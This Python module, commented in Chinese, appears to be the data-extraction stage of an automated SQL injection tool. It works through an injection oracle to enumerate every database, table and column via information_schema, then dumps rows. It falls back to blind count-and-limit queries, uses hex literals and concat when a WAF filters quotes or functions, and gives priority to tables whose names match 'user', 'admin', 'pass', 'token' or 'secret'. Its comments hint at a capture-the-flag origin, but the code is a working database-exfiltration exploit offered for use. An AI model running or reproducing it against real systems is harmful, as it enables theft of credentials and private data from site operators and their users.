"""数据提取流水线：库 → 表 → 列 → 数据（全自动脱库）。

- 优先 group_concat 一次取全（回显/报错通道）；
- 盲注通道自动改用 count + limit 逐行；
- 引号被过滤时表名等字符串走十六进制字面量。
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from .builder import PayloadBuilder
from .models import WafReport
from .oracles import BaseOracle, OracleError
from .session import HttpSession

INTERESTING = re.compile(r"flag|user|admin|secret|key|pass|token|config", re.I)


@dataclass
class DumpResult:
    database: str = ""
    version: str = ""
    user: str = ""
    databases: list = field(default_factory=list)
    tables: dict = field(default_factory=dict)          # db -> [tables]
    columns: dict = field(default_factory=dict)         # (db, table) -> [columns]
    rows: dict = field(default_factory=dict)            # (db, table) -> [ {col: val} ]

    def to_dict(self):
        return {
            "database": self.database, "version": self.version, "user": self.user,
            "databases": self.databases,
            "tables": {db: ts for db, ts in self.tables.items()},
            "columns": {f"{db}.{t}": cs for (db, t), cs in self.columns.items()},
            "rows": {f"{db}.{t}": rs for (db, t), rs in self.rows.items()},
        }


class ExtractionPipeline:
    def __init__(self, oracle: BaseOracle, builder: PayloadBuilder,
                 session: HttpSession, waf: WafReport):
        self.o = oracle
        self.b = builder
        self.s = session
        self.waf = waf
        self.log = session.log

    # ------------------------------------------------------------------ basic
    def version(self) -> str:
        return self.o.scalar("version()")

    def current_db(self) -> str:
        return self.o.scalar("database()")

    def current_user(self) -> str:
        return self.o.scalar("user()")

    # ------------------------------------------------------------------ meta
    def _can_group_concat(self) -> bool:
        return not self.waf.is_filtered("group_concat", "information_schema")

    def _fast_list(self, what: str, where: str) -> list:
        """group_concat 一次取回（快通道）。"""
        raw = self.o.scalar(f"(select group_concat({what}) from {where})")
        return [x for x in raw.split(",") if x]

    def _slow_list(self, what: str, where: str) -> list:
        """count + limit 逐行（盲注通道）。"""
        try:
            count = self.o.scalar_int(f"(select count({what}) from {where})")
        except OracleError:
            return []
        items = []
        for i in range(count):
            if self.s.stopped:
                break
            v = self.o.scalar(f"(select {what} from {where} limit {i},1)")
            if not v:
                break
            items.append(v)
        return items

    def list_databases(self) -> list:
        where = "information_schema.schemata"
        if self._can_group_concat():
            dbs = self._fast_list("schema_name", where)
        else:
            dbs = self._slow_list("schema_name", where)
        return dbs or []

    def list_tables(self, db: str) -> list:
        lit = self.b.str_lit(db)
        where = f"information_schema.tables where table_schema={lit}"
        if self._can_group_concat():
            return self._fast_list("table_name", where)
        return self._slow_list("table_name", where)

    def list_columns(self, db: str, table: str) -> list:
        lit = self.b.str_lit(table)
        where = (f"information_schema.columns where table_schema="
                 f"{self.b.str_lit(db)} and table_name={lit}")
        if self._can_group_concat():
            return self._fast_list("column_name", where)
        return self._slow_list("column_name", where)

    # ------------------------------------------------------------------ data
    def dump_rows(self, db: str, table: str, columns: list,
                  max_rows: int = 20) -> list:
        if not self.waf.is_filtered("concat_ws"):
            cols_expr = ("concat_ws(0x7e," +
                         ",".join(f"ifnull({c},0x4e554c4c)" for c in columns) + ")")
        else:
            sep = ""
            parts = []
            for c in columns:
                parts.append(f"ifnull({c},0x4e554c4c)")
                parts.append("0x7e")
            cols_expr = "concat(" + ",".join(parts[:-1]) + ")"
        rows = []
        for i in range(max_rows):
            if self.s.stopped:
                break
            raw = self.o.scalar(
                f"(select {cols_expr} from {db}.{table} limit {i},1)")
            if not raw:
                break
            parts = raw.split("~")
            row = {c: (parts[j] if j < len(parts) else "") for j, c in enumerate(columns)}
            rows.append(row)
            self.log("DATA", f"[{db}.{table}] {row}")
        return rows

    def table_row_count(self, db: str, table: str) -> int:
        try:
            return self.o.scalar_int(f"(select count(*) from {db}.{table})")
        except OracleError:
            return -1

    # ------------------------------------------------------------------ auto
    def auto_dump(self, max_rows: int = 20, dump_all_dbs: bool = False) -> DumpResult:
        res = DumpResult()
        res.version = self.version()
        res.database = self.current_db()
        res.user = self.current_user()
        self.log("INFO", f"[脱库] version={res.version} db={res.database} user={res.user}")

        res.databases = self.list_databases()
        self.log("INFO", f"[脱库] 所有数据库: {res.databases}")

        targets = res.databases if dump_all_dbs else [d for d in [res.database] if d]
        for db in targets:
            if self.s.stopped:
                break
            tables = self.list_tables(db)
            res.tables[db] = tables
            self.log("INFO", f"[脱库] {db} 的表: {tables}")

        # 取全部列结构
        for db, tables in res.tables.items():
            for t in tables:
                if self.s.stopped:
                    break
                cols = self.list_columns(db, t)
                res.columns[(db, t)] = cols
                self.log("INFO", f"[脱库] {db}.{t} 的列: {cols}")

        # 有干货的表优先（表名或列名命中关键词，如数字表名 1919810931114514 藏 flag 列）
        hot = []
        for (db, t), cols in res.columns.items():
            pri = 2 if (INTERESTING.search(t)
                        or any(INTERESTING.search(c) for c in cols)) else 1
            hot.append((pri, db, t))
        hot.sort(reverse=True)

        for pri, db, t in hot:
            if self.s.stopped:
                break
            cols = res.columns.get((db, t), [])
            if cols and pri == 2:
                res.rows[(db, t)] = self.dump_rows(db, t, cols, max_rows)
        return res
